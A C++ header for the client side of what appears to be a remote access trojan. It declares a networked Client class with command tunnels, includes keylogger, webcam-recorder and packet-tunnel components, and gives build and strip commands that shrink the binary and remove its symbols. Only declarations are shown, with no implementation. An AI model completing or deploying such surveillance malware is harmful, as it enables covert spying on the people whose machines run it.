#ifndef CLIENT_HPP
#define CLIENT_HPP

#include <cstdio> // for printf, later will be removed
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <math.h>
#include "cldata_handler.hpp"
#include "common.hpp"
#include "client_macros.hpp"
#include "clkeylogger.hpp"
#include "clwebcam_recorder.hpp"
#include "clpacket_tunnel.hpp"

// g++ client.cpp -o client -Os -s
// strip client

class Client {
public:
    Client(const char* __ip, const int __port);
    int init();
    void start();
    void shutdown();
    void cleanup();
private:
    char ip_[MAX_IP_LEN];
    int port_;
    int socket_;
    bool shutdown_flag_ = false;
    bool retry_flag_ = false;
    struct sockaddr_in server_addr_;
    CLTunnel cltunnels_[TUNNEL_NUMS];
    
    CLTunnel* get_cltunnel(CommandCode __tunnel_code);
    int is_valid_tunnel(CommandCode __tunnel_code);
};

#endif // CLIENT_HPP